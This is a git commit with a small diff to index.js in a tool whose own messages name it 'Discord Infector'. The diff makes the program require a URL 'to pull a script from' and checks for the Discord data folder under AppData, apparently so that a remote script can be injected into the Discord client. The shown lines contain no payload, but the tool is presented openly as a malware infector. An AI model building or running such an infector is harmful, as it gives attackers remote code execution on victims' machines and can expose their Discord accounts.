6d5342b3c214957533c574604bb830d49a2da0dd
nick <nick@noemail4unonon.comlol>
2020-01-19 16:22:01 -0500

    Mandate a URL must be passed as an argument.

--- index.js
+++ index.js
@@ -1,5 +1,12 @@
 const fs = require('fs');
 const discordPath = process.env.AppData + '/Discord';
+
+if(process.argv.length < 3){
+	console.error(`Discord Infector must be run with a URL to pull a script from.`);
+	console.error(`Example: .\\discordinfector.exe https://example.org/examplescript.js`);
+	process.exit();
+}
+
 if(!fs.existsSync(discordPath)){
 	console.error(`Cannot find discord data in ${discordPath}!`);
 	process.exit();
